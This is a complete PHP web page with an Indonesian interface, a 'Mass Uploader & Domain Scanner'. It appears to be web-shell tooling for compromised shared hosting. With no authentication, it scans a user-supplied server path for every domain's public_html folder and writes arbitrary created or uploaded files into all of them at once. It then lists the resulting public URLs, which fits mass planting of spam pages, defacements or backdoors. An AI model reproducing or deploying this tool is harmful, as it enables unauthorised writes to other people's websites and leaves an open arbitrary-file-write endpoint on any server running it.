<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(600);
ini_set('memory_limit', '512M');

$default_path = __DIR__;
$scan_path = $_GET['scan_path'] ?? $default_path;
$response = "";

$TEMP_DIR = __DIR__ . '/_uploader_tmp';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $mode   = $_POST['mode'] ?? 'upload';

    $targets = [];
    if ($action === 'single') {
        $targets[] = trim($_POST['single_dir'] ?? '');
    } elseif ($action === 'mass') {
        if (!empty($_POST['mass_dirs'])) {
            $targets = $_POST['mass_dirs'];
        } elseif (!empty($_POST['manual_dirs'])) {
            $targets = array_filter(array_map('trim', explode("\n", $_POST['manual_dirs'])));
        }
    }

    if ($mode === 'create') {
        $file_name = trim($_POST['create_filename'] ?? '');
        $content   = $_POST['create_content'] ?? '';

        if ($file_name === '') {
            $response = "<div style='color:#ff5252; background:#3a1d1d; padding:10px; border-radius:4px;'>Error: Nama file belum diisi!</div>";
        } elseif (empty($targets)) {
            $response = "<div style='color:#ff5252; background:#3a1d1d; padding:10px; border-radius:4px;'>Error: Pilih target domain dulu!</div>";
        } else {
            $lines = [];
            $total_success = 0;
            $total_failed  = 0;

            foreach ($targets as $dir) {
                $clean_dir = rtrim(preg_replace('#/+#', '/', $dir), '/\\');

                $path_parts = explode('/', $clean_dir);
                $domain_name = basename($clean_dir);
                if (($key = array_search('domains', $path_parts)) !== false && isset($path_parts[$key + 1])) {
                    $domain_name = $path_parts[$key + 1];
                }

                if (!is_dir($clean_dir)) @mkdir($clean_dir, 0755, true);

                if (is_dir($clean_dir) && is_writable($clean_dir)) {
                    $dest = $clean_dir . '/' . $file_name;
                    $written = @file_put_contents($dest, $content);

                    if ($written !== false) {
                        $lines[] = "https://{$domain_name}/{$file_name}";
                        $total_success++;
                    } else {
                        $total_failed++;
                    }
                } else {
                    $total_failed++;
                }
            }

            $plain_output = implode("\n", $lines);
            $escaped = htmlspecialchars($plain_output);
            $response = "<div style='background:#222; padding:15px; border:1px solid #444; border-radius:6px;'>
                            <h4 style='margin:0 0 10px 0; color:#4ecca3;'>Hasil Create File:</h4>
                            Berhasil: <b style='color:#4ecca3;'>$total_success</b> | Gagal: <b style='color:#ff5252;'>$total_failed</b>
                            <div style='margin-top:10px;'>
                                <button type='button' onclick=\"copyOutput()\" style='width:auto; padding:6px 12px; margin:0 0 8px 0; background:#007bff;'>📋 Copy Output</button>
                            </div>
                            <textarea id='output-box' readonly style='width:100%; height:300px; background:#111; color:#4ecca3; border:1px solid #444; padding:10px; font-family: monospace; font-size:13px; box-sizing:border-box;'>{$escaped}</textarea>
                         </div>";
        }
    }

    else {
        $files = $_FILES['files'] ?? null;

        if (!$files || empty($files['name'][0]) || $files['name'][0] === '') {
            $response = "<div style='color:#ff5252; background:#3a1d1d; padding:10px; border-radius:4px;'>Error: Pilih file terlebih dahulu!</div>";
        } else {
            if (!is_dir($TEMP_DIR)) @mkdir($TEMP_DIR, 0755, true);

            $stored_files = [];
            $fail_upload  = [];

            for ($i = 0; $i < count($files['name']); $i++) {
                $file_name = basename($files['name'][$i]);
                $tmp_name  = $files['tmp_name'][$i];
                $err_code  = $files['error'][$i] ?? UPLOAD_ERR_NO_FILE;
                $file_size = $files['size'][$i] ?? 0;

                if ($err_code !== UPLOAD_ERR_OK) {
                    $fail_upload[] = "$file_name — " . getUploadError($err_code);
                    continue;
                }
                if (!is_uploaded_file($tmp_name)) {
                    $fail_upload[] = "$file_name — bukan file upload valid";
                    continue;
                }
                if ($file_size <= 0 || filesize($tmp_name) <= 0) {
                    $fail_upload[] = "$file_name — file sumber 0 byte";
                    continue;
                }

                $temp_path = $TEMP_DIR . '/' . $file_name;
                if (move_uploaded_file($tmp_name, $temp_path)) {
                    $stored_files[] = [
                        'name' => $file_name,
                        'path' => $temp_path,
                        'size' => filesize($temp_path),
                    ];
                } else {
                    $fail_upload[] = "$file_name — gagal pindah ke folder temp";
                }
            }

            if (empty($stored_files)) {
                $err_list = implode('<br>', array_map('htmlspecialchars', $fail_upload));
                $response = "<div style='background:#3a1d1d; padding:15px; border:1px solid #ff5252; border-radius:4px;'>
                                <b style='color:#ff5252;'>Semua file gagal disimpan ke temp:</b><br>{$err_list}
                             </div>";
            } else {
                $lines = [];
                $total_success = 0;
                $total_failed  = 0;

                foreach ($targets as $dir) {
                    $clean_dir = rtrim(preg_replace('#/+#', '/', $dir), '/\\');

                    $path_parts = explode('/', $clean_dir);
                    $domain_name = basename($clean_dir);
                    if (($key = array_search('domains', $path_parts)) !== false && isset($path_parts[$key + 1])) {
                        $domain_name = $path_parts[$key + 1];
                    }

                    if (!is_dir($clean_dir)) @mkdir($clean_dir, 0755, true);

                    if (is_dir($clean_dir) && is_writable($clean_dir)) {
                        foreach ($stored_files as $sf) {
                            $dest = $clean_dir . '/' . $sf['name'];
                            if (@copy($sf['path'], $dest) && @filesize($dest) > 0) {
                                $lines[] = "https://{$domain_name}/{$sf['name']}";
                                $total_success++;
                            } else {
                                $total_failed++;
                            }
                        }
                    } else {
                        $total_failed += count($stored_files);
                    }
                }

                $plain_output = implode("\n", $lines);
                $escaped = htmlspecialchars($plain_output);
                $response = "<div style='background:#222; padding:15px; border:1px solid #444; border-radius:6px;'>
                                <h4 style='margin:0 0 10px 0; color:#4ecca3;'>Hasil Upload:</h4>
                                Berhasil: <b style='color:#4ecca3;'>$total_success</b> | Gagal: <b style='color:#ff5252;'>$total_failed</b>
                                <div style='margin-top:10px;'>
                                    <button type='button' onclick=\"copyOutput()\" style='width:auto; padding:6px 12px; margin:0 0 8px 0; background:#007bff;'>📋 Copy Output</button>
                                </div>
                                <textarea id='output-box' readonly style='width:100%; height:300px; background:#111; color:#4ecca3; border:1px solid #444; padding:10px; font-family: monospace; font-size:13px; box-sizing:border-box;'>{$escaped}</textarea>
                             </div>";
            }
        }
    }
}

function getUploadError($code) {
    switch ($code) {
        case UPLOAD_ERR_INI_SIZE:   return "Melebihi upload_max_filesize (".ini_get('upload_max_filesize').")";
        case UPLOAD_ERR_FORM_SIZE:  return "Melebihi MAX_FILE_SIZE di form";
        case UPLOAD_ERR_PARTIAL:    return "Upload terputus (partial)";
        case UPLOAD_ERR_NO_FILE:    return "Tidak ada file";
        case UPLOAD_ERR_NO_TMP_DIR: return "Folder tmp tidak ada";
        case UPLOAD_ERR_CANT_WRITE: return "Gagal tulis ke disk";
        case UPLOAD_ERR_EXTENSION:  return "Diblokir oleh extension PHP";
        default:                    return "Error code tidak diketahui ($code)";
    }
}

function scanDomains($path) {
    $results = [];
    if (is_dir($path)) {
        $handle = opendir($path);
        if ($handle) {
            while (false !== ($entry = readdir($handle))) {
                if ($entry === '.' || $entry === '..') continue;
                $full_path = $path . '/' . $entry;
                if (is_dir($full_path)) {
                    $pub_html = $full_path . '/public_html';
                    $results[] = is_dir($pub_html) ? $pub_html : $full_path;
                }
            }
            closedir($handle);
        }
    }
    return $results;
}

$scanned_folders = [];
if (isset($_GET['scan']) && $_GET['scan'] == '1') {
    $scanned_folders = scanDomains($scan_path);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Mass Uploader & Clean Domain Output</title>
    <style>
        body { font-family: sans-serif; background: #1e1e1e; color: #fff; padding: 20px; }
        .box { background: #2d2d2d; padding: 20px; border-radius: 6px; max-width: 900px; margin: auto; }
        input, textarea, button { width: 100%; padding: 8px; margin-top: 5px; margin-bottom: 15px; background: #333; color: #fff; border: 1px solid #555; box-sizing: border-box; border-radius: 4px; font-family: inherit; }
        button { background: #007bff; border: none; cursor: pointer; font-weight: bold; }
        button:hover { background: #0056b3; }
        .checkbox-list { max-height: 250px; overflow-y: auto; background: #1a1a1a; padding: 10px; border: 1px solid #444; border-radius: 4px; }
        .checkbox-list label { display: block; margin-bottom: 5px; font-weight: normal; }
        .info { background: #1a2a3a; border: 1px solid #2a4a6a; padding: 10px; border-radius: 4px; font-size: 13px; margin-bottom: 15px; }
        .info b { color: #4ecca3; }
        .tabs { display: flex; gap: 0; margin-bottom: 20px; border-bottom: 2px solid #444; }
        .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; background: #222; border: 1px solid #444; border-bottom: none; color: #aaa; font-weight: bold; border-radius: 6px 6px 0 0; }
        .tab.active { background: #2d2d2d; color: #4ecca3; border-bottom: 2px solid #2d2d2d; margin-bottom: -2px; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .hint { font-size: 12px; color: #888; margin-top: -10px; margin-bottom: 15px; }
    </style>
</head>
<body>
<div class="box">
    <h2>PHP Mass Uploader & Domain Scanner</h2>

    <div class="info">
        <b>Server Limits:</b>
        upload_max_filesize = <?php echo ini_get('upload_max_filesize'); ?> |
        post_max_size = <?php echo ini_get('post_max_size'); ?> |
        memory_limit = <?php echo ini_get('memory_limit'); ?> |
        max_execution_time = <?php echo ini_get('max_execution_time'); ?>s
    </div>

    <?php echo $response; ?>

    <div class="tabs">
        <div class="tab active" onclick="switchTab('tab-create')" id="tabbtn-create">🆕 Create File</div>
        <div class="tab" onclick="switchTab('tab-upload')" id="tabbtn-upload">📤 Upload File</div>
    </div>

    <div id="tab-create" class="tab-content active">
        <form action="" method="POST">
            <input type="hidden" name="mode" value="create">

            <label>Nama File:</label>
            <input type="text" name="create_filename" placeholder="not.txt" required>

            <label>Isi Konten File:</label>
            <textarea name="create_content" rows="6" placeholder="Isi file di sini..." style="font-family: monospace;"></textarea>

            <hr style="border-color: #444;">

            <label>Path Root Direktori:</label>
            <div style="display: flex; gap: 10px;">
                <input type="text" name="scan_path_input" id="scan_path_input1" value="<?php echo htmlspecialchars($scan_path); ?>">
                <button type="button" onclick="location.href='?scan=1&scan_path=' + encodeURIComponent(document.getElementById('scan_path_input1').value)" style="width: 150px;">Scan Folder</button>
            </div>

            <?php if (!empty($scanned_folders)): ?>
                <input type="hidden" name="action" value="mass">
                <label>Hasil Scan:</label>
                <div class="checkbox-list">
                    <div style="margin-bottom: 5px;"><input type="checkbox" id="select-all-1" onclick="toggleAll(this)"> <b>Pilih Semua</b></div>
                    <?php foreach ($scanned_folders as $folder): ?>
                        <label><input type="checkbox" name="mass_dirs[]" value="<?php echo htmlspecialchars($folder); ?>"> <?php echo htmlspecialchars($folder); ?></label>
                    <?php endforeach; ?>
                </div>
                <button type="submit" style="margin-top: 15px; background: #28a745;">Buat File</button>
            <?php else: ?>
                <input type="hidden" name="action" value="single">
                <label>Target Single Direktori:</label>
                <input type="text" name="single_dir" placeholder="/home/u251307397/domains/namadomain.com/public_html">
                <button type="submit" style="background: #28a745;">Buat File</button>
            <?php endif; ?>
        </form>
    </div>

    <div id="tab-upload" class="tab-content">
        <form action="" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="mode" value="upload">

            <label>Pilih File:</label>
            <input type="file" name="files[]" multiple required>

            <hr style="border-color: #444;">

            <label>Path Root Direktori:</label>
            <div style="display: flex; gap: 10px;">
                <input type="text" name="scan_path_input" id="scan_path_input2" value="<?php echo htmlspecialchars($scan_path); ?>">
                <button type="button" onclick="location.href='?scan=1&scan_path=' + encodeURIComponent(document.getElementById('scan_path_input2').value)" style="width: 150px;">Scan Folder</button>
            </div>

            <?php if (!empty($scanned_folders)): ?>
                <input type="hidden" name="action" value="mass">
                <label>Hasil Scan:</label>
                <div class="checkbox-list">
                    <div style="margin-bottom: 5px;"><input type="checkbox" id="select-all-2" onclick="toggleAll(this)"> <b>Pilih Semua</b></div>
                    <?php foreach ($scanned_folders as $folder): ?>
                        <label><input type="checkbox" name="mass_dirs[]" value="<?php echo htmlspecialchars($folder); ?>"> <?php echo htmlspecialchars($folder); ?></label>
                    <?php endforeach; ?>
                </div>
                <button type="submit" style="margin-top: 15px; background: #28a745;">Upload</button>
            <?php else: ?>
                <input type="hidden" name="action" value="single">
                <label>Target Single Direktori:</label>
                <input type="text" name="single_dir" placeholder="/home/u251307397/domains/namadomain.com/public_html">
                <button type="submit" style="background: #28a745;">Upload File</button>
            <?php endif; ?>
        </form>
    </div>
</div>

<script>
function toggleAll(source) {
    var activeForm = document.querySelector('.tab-content.active');
    var checkboxes = activeForm.querySelectorAll('input[name="mass_dirs[]"]');
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
}

function switchTab(id) {
    document.querySelectorAll('.tab-content').forEach(function(el) { el.classList.remove('active'); });
    document.querySelectorAll('.tab').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');
    document.getElementById('tabbtn-' + id.replace('tab-', '')).classList.add('active');
}

function copyOutput() {
    var box = document.getElementById('output-box');
    if (!box) return;
    box.select();
    box.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(box.value).then(function() {
        alert('Output berhasil di-copy!');
    }).catch(function() {
        document.execCommand('copy');
        alert('Output berhasil di-copy!');
    });
}
</script>
</body>
</html>